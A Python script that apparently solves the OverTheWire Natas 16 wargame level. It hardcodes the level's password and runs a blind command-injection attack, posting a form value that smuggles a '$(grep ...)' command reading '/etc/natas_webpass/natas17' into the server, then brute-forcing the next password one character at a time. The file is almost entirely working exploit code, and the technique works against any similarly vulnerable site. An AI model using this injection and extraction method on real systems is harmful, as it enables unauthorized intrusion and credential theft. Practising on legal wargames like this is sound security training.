#!/usr/bin/env python3

import requests
import re
from string import *

characters = ascii_letters + digits

username = 'natas16'
password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'

url = 'http://%s.natas.labs.overthewire.org/' %username

session = requests.Session()
#response = session.get(url, auth = (username, password))

seen_password = list()

while(len(seen_password) < 32):
    for ch in characters:
        print(str(len(seen_password)) + "/32 - Testando "+"".join(seen_password)+ch+"...")
        response = session.post(url, data = {"needle" : 'anythings$(grep ^' + "".join(seen_password) + ch +' /etc/natas_webpass/natas17)'}, auth = (username, password))
        content = response.text

        returned = re.findall('<pre>\n(.*)\n</pre>', content)
        if (not returned):
            seen_password.append(ch)
            break
print("".join(seen_password))
